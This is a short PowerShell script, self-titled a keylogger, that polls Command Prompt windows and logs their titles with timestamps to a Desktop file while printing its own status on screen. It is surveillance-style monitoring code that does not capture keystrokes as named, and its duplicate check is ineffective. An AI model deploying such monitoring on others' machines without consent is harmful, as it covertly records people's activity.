# Simple_CMD_Keylogger.ps1
# Simple script to capture commands typed in Command Prompt

$logFile = "$env:USERPROFILE\Desktop\cmdlog.txt"
Add-Content -Path $logFile -Value "===== CMD Command Capture Started at $(Get-Date) ====="

Write-Host "CMD Command Capture Running..." -ForegroundColor Green
Write-Host "Logging to: $logFile" -ForegroundColor Yellow
Write-Host "Press Ctrl+C to stop`n" -ForegroundColor Yellow

while ($true) {
    # Get all cmd windows
    $cmdProcesses = Get-Process -Name cmd -ErrorAction SilentlyContinue
    
    foreach ($proc in $cmdProcesses) {
        try {
            # Get the command line of the process
            $commandLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)").CommandLine
            
            # Get the window title (often shows current command)
            $title = $proc.MainWindowTitle
            
            # Only log if there's something in the title or if it's a new command
            if ($title -and $title -ne "Command Prompt" -and $title -ne "C:\Windows\system32\cmd.exe") {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logEntry = "[$timestamp] PID:$($proc.Id) - Command: $title"
                
                # Check if we already logged this
                $lastEntry = Get-Content $logFile -Tail 1
                if ($logEntry -ne $lastEntry) {
                    Add-Content -Path $logFile -Value $logEntry
                    Write-Host "Command detected: $title" -ForegroundColor Green
                }
            }
        }
        catch {
            # Silently continue on error
        }
    }
    
    Start-Sleep -Milliseconds 500
}
